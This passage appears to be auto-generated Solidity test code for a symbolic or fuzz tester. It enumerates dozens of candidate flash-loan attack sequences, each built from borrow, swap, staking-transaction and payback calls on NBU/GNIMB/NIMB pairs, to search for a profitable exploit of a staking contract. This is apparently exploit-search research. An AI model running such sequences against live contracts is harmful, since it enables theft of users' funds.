        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4835(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4836(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4837(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4838(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4839(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4840(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4841(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4842(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4843(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4844(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4845(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4846(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4847(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4848(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4849(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4850(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4851(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4852(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4853(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4854(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4855(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4856(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4857(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4858(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4859(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4860(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4861(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4862(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4863(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4864(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4865(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4866(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4867(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4868(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4869(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4870(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4871(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4872(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4873(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4874(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4875(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4876(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4877(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4878(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4879(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
